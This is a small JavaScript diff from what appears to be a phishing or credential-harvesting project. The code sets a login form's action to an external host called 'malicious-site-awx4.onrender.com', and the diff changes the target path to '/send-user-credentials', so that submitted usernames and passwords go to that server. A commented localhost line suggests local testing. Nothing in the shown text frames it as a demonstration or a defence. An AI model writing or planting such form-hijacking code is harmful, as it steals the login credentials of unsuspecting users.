@@ -8,6 +8,7 @@ const password = document
   .querySelector('input[type="password"]')
   .setAttribute("name", "password");
 
-const maliciousSite = "https://malicious-site-awx4.onrender.com";
+const maliciousSite =
+  "https://malicious-site-awx4.onrender.com/send-user-credentials";
 // form.setAttribute("action", "http://localhost:3000/send-user-credentials");
 form.setAttribute("action", maliciousSite);
